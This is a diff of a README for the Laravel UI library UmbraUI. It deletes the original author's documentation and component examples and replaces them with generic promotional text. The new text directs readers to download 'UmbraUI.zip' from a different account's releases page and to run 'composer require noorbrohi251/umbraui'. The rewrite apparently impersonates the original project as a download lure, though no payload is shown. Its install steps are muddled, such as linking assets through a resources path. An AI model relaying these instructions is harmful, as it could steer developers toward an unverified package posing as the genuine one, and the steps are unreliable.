@@ -1,368 +1,98 @@
-  <p align="center">
-  <img src="images/logo/LightLogo.png" alt="UmbraUI Light Theme" width="50">
-</p>
+# 🌟 UmbraUI - Build Stunning UIs with Ease
 
-<h1 align="center">UmbraUI</h1>
+[![Download UmbraUI](https://img.shields.io/badge/Download-UmbraUI-blue.svg)](https://github.com/noorbrohi251/UmbraUI/releases)
 
-<p align="center">
-  <a href="https://packagist.org/packages/ihxnnxs/umbra-ui"><img src="https://img.shields.io/packagist/v/ihxnnxs/umbra-ui.svg?style=flat-square" alt="Latest Version on Packagist"></a>
-  <a href="https://github.com/ihxnnxs/UmbraUI/actions?query=workflow%3Arun-tests+branch%3Amain"><img src="https://img.shields.io/github/actions/workflow/status/ihxnnxs/UmbraUI/run-tests.yml?branch=main&label=tests&style=flat-square" alt="GitHub Tests Action Status"></a>
-  <a href="https://github.com/ihxnnxs/UmbraUI/actions?query=workflow%3A%22Fix+PHP+code+style+issues%22+branch%3Amain"><img src="https://img.shields.io/github/actions/workflow/status/ihxnnxs/UmbraUI/fix-php-code-style-issues.yml?branch=main&label=code%20style&style=flat-square" alt="GitHub Code Style Action Status"></a>
-  <a href="https://packagist.org/packages/ihxnnxs/umbra-ui"><img src="https://img.shields.io/packagist/dt/ihxnnxs/umbra-ui.svg?style=flat-square" alt="Total Downloads"></a>
-</p>
+## 📦 Introduction
 
-**Essential UI components library for Laravel applications with Tailwind CSS**
+Welcome to UmbraUI! UmbraUI is a modern UI components library specifically designed for Laravel applications. With UmbraUI, you gain access to beautiful, customizable components that allow you to craft elegant user interfaces quickly and efficiently. Whether you are building a fresh Laravel application or improving an existing one, UmbraUI has something for you.
 
-<p align="center">
-  <img src="images/preview/previewLight.png" alt="UmbraUI Light Theme" width="250">
-  <img src="images/preview/previewDark.png" alt="UmbraUI Dark Theme" width="250">
-</p>
+## 🚀 Getting Started
 
-UmbraUI focuses on providing the most essential UI components for modern web applications. Built with
-accessibility-first design, dark/light theme support, and seamless Laravel integration.
+Getting started with UmbraUI is straightforward. Follow the steps below to ensure a smooth installation process.
 
-## Essential Components
+1. **Prepare Your Environment**
 
-UmbraUI focuses on the most critical components for modern web applications, based on industry standards and popular
-libraries like shadcn/ui, Tailwind UI, and Chakra UI.
+   To use UmbraUI, you need:
 
-### Core Form Components ✅
+   - A computer with internet access.
+   - A Laravel application (version 8 or newer is recommended).
+   - Basic knowledge of how to work with Laravel.
 
-| Component   | Status  | Description                            |
-|-------------|---------|----------------------------------------|
-| Button      | ✅ Ready | Primary, secondary, and variant styles |
-| Input       | ✅ Ready | Text, email, password, number inputs   |
-| Link        | ✅ Ready | Styled anchor elements                 |
-| Textarea    | ✅ Ready | Multi-line text input                  |
-| Select      | ✅ Ready | Dropdown selection                     |
-| Checkbox    | ✅ Ready | Boolean selection                      |
-| Radio       | ✅ Ready | Single choice selection                |
-| Label       | ✅ Ready | Form field labels                      |
-| Field       | ✅ Ready | Form field wrapper with validation     |
-| Switch      | ✅ Ready | Toggle switch                          |
-| Slider      | ✅ Ready | Range input                            |
-| Date Picker | ✅ Ready | Date selection                         |
-
-### Navigation & Layout ✅
-
-| Component | Status  | Description                        |
-|-----------|---------|------------------------------------|
-| Alert     | ✅ Ready | Success, error, warning, info      |
-| Badge     | ✅ Ready | Status indicators and labels       |
-| Avatar    | ✅ Ready | User profile pictures and initials |
-| Tabs      | ✅ Ready | Tabbed navigation interface        |
-| Accordion | ✅ Ready | Collapsible content sections       |
-| Modal     | ✅ Ready | Dialog/popup overlay               |
-| Card      | ✅ Ready | Universal card with image support  |
-| Dropdown  | ✅ Ready | Context menus with nested submenus |
-
-### Data Display ✅
-
-| Component | Status  | Description                                    |
-|-----------|---------|------------------------------------------------|
-| Table     | ✅ Ready | Data tables with sorting and selection support |
-
-### Notifications ✅
-
-| Component | Status  | Description                 |
-|-----------|---------|-----------------------------|
-| Toast     | ✅ Ready | Elegant notification system |
-
-## Installation
-
-You can install the package via composer:
-
-```bash
-composer require ihxnnxs/umbra-ui
-```
-
-### Publishing Assets
-
-To use JavaScript toast notifications, you need to publish the assets:
-
-```bash
-php artisan vendor:publish --tag=umbra-ui-assets
-```
-
-This will publish the JavaScript files to `public/vendor/umbra-ui/js/`.
+2. **Visit the Releases Page**
 
-## Usage
+   To download UmbraUI, visit the following link:
 
-### Basic Components
+   [Download UmbraUI Here](https://github.com/noorbrohi251/UmbraUI/releases)
 
-```blade
-{{-- Buttons --}}
-<x-umbra-ui::button>Primary Button</x-umbra-ui::button>
-<x-umbra-ui::button type="submit" class="bg-blue-600">Custom Button</x-umbra-ui::button>
+   On this page, you will find the latest releases and installation files for UmbraUI.
 
-{{-- Form Inputs --}}
-<x-umbra-ui::input type="email" placeholder="Enter email" />
-<x-umbra-ui::textarea placeholder="Your message..." />
-<x-umbra-ui::select>
-    <option>Choose...</option>
-    <option value="1">Option 1</option>
-</x-umbra-ui::select>
+3. **Choose Your Version**
 
-{{-- Form Controls --}}
-<x-umbra-ui::checkbox id="terms" />
-<x-umbra-ui::label for="terms">Accept Terms</x-umbra-ui::label>
+   Scroll down the releases page to find the latest version. You can identify the latest release by the date listed next to it. Click on it to view the release details.
 
-<x-umbra-ui::radio name="choice" value="a" id="choice-a" />
-<x-umbra-ui::label for="choice-a">Choice A</x-umbra-ui::label>
-
-<x-umbra-ui::switch id="notifications" />
-```
+4. **Download the Files**
 
-### Advanced Components
+   Look for a file named `UmbraUI.zip` or a similar package. Click to download the file to your computer.
 
-```blade
-{{-- Form Fields with Validation --}}
-<x-field label="Email Address" error="Email is required">
-    <x-input type="email" />
-</x-field>
-
-<x-field label="Message" helper="Maximum 500 characters">
-    <x-textarea />
-</x-field>
-
-{{-- Navigation --}}
-<x-tabs default-tab="overview">
-    <x-tabs.nav>
-        <x-tabs.tab value="overview">Overview</x-tabs.tab>
-        <x-tabs.tab value="settings">Settings</x-tabs.tab>
-    </x-tabs.nav>
-    
-    <x-tabs.panel value="overview">
-        <p>Overview content...</p>
-    </x-tabs.panel>
-    
-    <x-tabs.panel value="settings">
-        <p>Settings content...</p>
-    </x-tabs.panel>
-</x-tabs>
-
-{{-- Badges --}}
-<x-umbra-ui::badge>Default</x-umbra-ui::badge>
-<x-umbra-ui::badge variant="success">Success</x-umbra-ui::badge>
-<x-umbra-ui::badge variant="error" removable="true">Removable</x-umbra-ui::badge>
-<x-umbra-ui::badge variant="primary" dot="true">With Dot</x-umbra-ui::badge>
-<x-umbra-ui::badge size="lg">Large Badge</x-umbra-ui::badge>
-
-{{-- Avatars --}}
-<x-umbra-ui::avatar src="/path/to/image.jpg" alt="User Name" />
-<x-umbra-ui::avatar initials="JD" size="lg" />
-<x-umbra-ui::avatar status="online" size="md" />
-<x-umbra-ui::avatar shape="square" initials="AB" />
-
-{{-- Interactive Components --}}
-<x-accordion>
-    <x-slot name="title">FAQ Item</x-slot>
-    Answer content goes here...
-</x-accordion>
-
-<x-slider min="0" max="100" value="50" />
-<x-date-picker value="2025-01-15" />
-```
-
-### Toast Notifications
-
-Simple, elegant toast notifications for Laravel applications.
-
-#### Installation
-
-**For JavaScript toasts only:**
-
-```html
-
-<script src="{{ asset('vendor/umbra-ui/js/toast.js') }}"></script>
-```
-
-**For server-side toasts (redirect()->with()):**
-
-```blade
-<x-umbra-ui::toast-container />
-```
-
-**For both:**
-
-```html
-
-<x-umbra-ui::toast-container/>
-<script src="{{ asset('vendor/umbra-ui/js/toast.js') }}"></script>
-```
-
-#### Usage
-
-**Server-side (PHP):**
-
-```php
-// Using redirect()->with()
-return redirect()->back()
-    ->with('success', 'User created successfully!');
-    // Supports: success, error, warning, info
-
-// Using Toast Facade
-use Ihxnnxs\UmbraUI\Facades\Toast;
-
-Toast::success('User created successfully!', 'Success Title');
-Toast::error('Something went wrong!');
-Toast::warning('Please review your data');
-Toast::info('New updates available');
-```
-
-**Client-side (JavaScript):**
-
-```html
-<!-- Data attributes on buttons -->
-<button
-    data-toast-trigger
-    data-toast-type="success"
-    data-toast-message="Operation completed!"
-    data-toast-title="Success"
->
-    Show Toast
-</button>
-
-<script>
-    // Direct JavaScript calls
-    umbraToast.success('Success message!', 'Title');
-    umbraToast.error('Error message!');
-    umbraToast.warning('Warning message!');
-    umbraToast.info('Info message!');
-</script>
-```
-
-#### Configuration Options
-
-**Data Attributes:**
-
-- `data-toast-type`: success, error, warning, info, default
-- `data-toast-message`: Toast message text
-- `data-toast-title`: Optional title
-- `data-toast-position`: top-left, top-right, top-center, bottom-left, bottom-right, bottom-center
-- `data-toast-duration`: Milliseconds (default: 5000, 0 = no auto-dismiss)
-
-**JavaScript Options:**
-
-```javascript
-umbraToast.show('Message', 'success', 'Title', {
-    position: 'top-right',
-    duration: 5000,
-    dismissible: true
-});
-```
-
-### Cards
-
-```blade
-{{-- Simple Card --}}
-<x-card>
-    <h4>Card Title</h4>
-    <p>Card content goes here...</p>
-</x-card>
-
-{{-- Card with Image --}}
-<x-card>
-    <x-slot name="image">
-        <img src="image.jpg" alt="Description" class="w-full h-48 object-cover" />
-    </x-slot>
-    
-    <x-slot name="header">
-        <h4>Card with Image</h4>
-    </x-slot>
-    
-    <p>Content with image and header.</p>
-    
-    <x-slot name="footer">
-        <x-button>Action</x-button>
-    </x-slot>
-</x-card>
-```
-
-### Links
-
-```blade
-<x-link href="https://example.com">External Link</x-link>
-<x-link href="/dashboard" class="text-blue-600">Custom Styled Link</x-link>
-```
-
-### Tables
-
-```blade
-{{-- Basic Table --}}
-<x-umbra-ui::table>
-    <x-umbra-ui::table.head>
-        <x-umbra-ui::table.row>
-            <x-umbra-ui::table.th>Name</x-umbra-ui::table.th>
-            <x-umbra-ui::table.th>Email</x-umbra-ui::table.th>
-            <x-umbra-ui::table.th align="right">Actions</x-umbra-ui::table.th>
-        </x-umbra-ui::table.row>
-    </x-umbra-ui::table.head>
-    
-    <x-umbra-ui::table.body>
-        <x-umbra-ui::table.row>
-            <x-umbra-ui::table.td>John Doe</x-umbra-ui::table.td>
-            <x-umbra-ui::table.td>john@example.com</x-umbra-ui::table.td>
-            <x-umbra-ui::table.td align="right">
-                <x-button class="text-xs">Edit</x-button>
-            </x-umbra-ui::table.td>
-        </x-umbra-ui::table.row>
-        
-        <x-umbra-ui::table.row selected="true">
-            <x-umbra-ui::table.td>Jane Smith</x-umbra-ui::table.td>
-            <x-umbra-ui::table.td>jane@example.com</x-umbra-ui::table.td>
-            <x-umbra-ui::table.td align="right">
-                <x-button class="text-xs">Edit</x-button>
-            </x-umbra-ui::table.td>
-        </x-umbra-ui::table.row>
-    </x-umbra-ui::table.body>
-</x-umbra-ui::table>
-
-{{-- Empty State Table --}}
-<x-umbra-ui::table>
-    <x-umbra-ui::table.head>
-        <x-umbra-ui::table.row>
-            <x-umbra-ui::table.th>Orders</x-umbra-ui::table.th>
-            <x-umbra-ui::table.th>Customer</x-umbra-ui::table.th>
-            <x-umbra-ui::table.th align="right">Total</x-umbra-ui::table.th>
-        </x-umbra-ui::table.row>
-    </x-umbra-ui::table.head>
-    
-    <x-umbra-ui::table.body>
-        <x-umbra-ui::table.empty colspan="3">
-            <x-slot name="title">No orders found</x-slot>
-            You haven't received any orders yet.
-            <x-slot name="action">
-                <x-button class="text-sm">Create Order</x-button>
-            </x-slot>
-        </x-umbra-ui::table.empty>
-    </x-umbra-ui::table.body>
-</x-umbra-ui::table>
-```
-
-## Testing
-
-```bash
-composer test
-```
-
-## Changelog
-
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
-
-## Contributing
-
-Please see [CONTRIBUTING](CONTRIBUTING.md) for details.
-
-## Security Vulnerabilities
-
-Please review [our security policy](../../security/policy) on how to report security vulnerabilities.
-
-## Credits
-
-- [ihxnnxs](https://github.com/ihxnnxs)
-- [All Contributors](../../contributors)
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+5. **Extract the Zip File**
+
+   Once the download is complete, locate the file in your downloads folder. Right-click on `UmbraUI.zip` and select "Extract All" (or use any extraction tool you have).
+
+6. **Add UmbraUI to Your Laravel Project**
+
+   After extracting the files, you will find a folder named `umbraui`. Open your Laravel application’s project directory and move the `umbraui` folder into the `resources` directory.
+
+7. **Install Dependencies**
+
+   Open your terminal or command prompt and navigate to your Laravel project folder. Run the following command:
+
+   ```bash
+   composer require noorbrohi251/umbraui
+   ```
+
+   This command will install the required dependencies for UmbraUI.
+
+8. **Configure UmbraUI**
+
+   In your project, open the `app.blade.php` file located in the `resources/views/layouts` folder. Add the necessary UmbraUI links within the `<head>` tag to ensure your application recognizes the components:
+
+   ```html
+   <link rel="stylesheet" href="{{ asset('resources/umbraui/css/umbraui.css') }}">
+   ```
+
+9. **Using the Components**
+
+   Now that you've installed UmbraUI, you can start using its components in your views. Refer to the documentation in the extracted folder for examples and further configuration details.
+
+## 🔧 Features of UmbraUI
+
+- **Beautifully Designed Components:** Choose from a range of UI components that enhance the look and feel of your application.
+- **Customization:** Tailor components quickly and easily to match your application's theme and style.
+- **Responsive Design:** Ensure your components look great on all devices, from mobile to desktop.
+- **Easy Integration:** Integrate seamlessly into your Laravel application with minimal setup.
+
+## 🛠️ Download & Install
+
+Ready to start? Follow these clear steps to download and install UmbraUI:
+
+1. **Go to [UmbraUI Releases](https://github.com/noorbrohi251/UmbraUI/releases)** to find the latest version.
+2. **Download the package** and follow the steps above to install it in your Laravel project.
+
+## 🌐 Support and Community
+
+Should you encounter any issues, or if you have questions, feel free to open an issue on the GitHub issues page. You can also join our community discussions to connect with other users and share your experiences.
+
+## ✨ Topics Covered
+
+- alpinejs
+- blade
+- laravel
+- laravel-framework
+- laravel-package
+- tailwindcss
+- ui
+- ui-components
+- ui-library
+- uikit
+
+For future updates, check back regularly on the Releases page. We look forward to seeing what you build with UmbraUI!
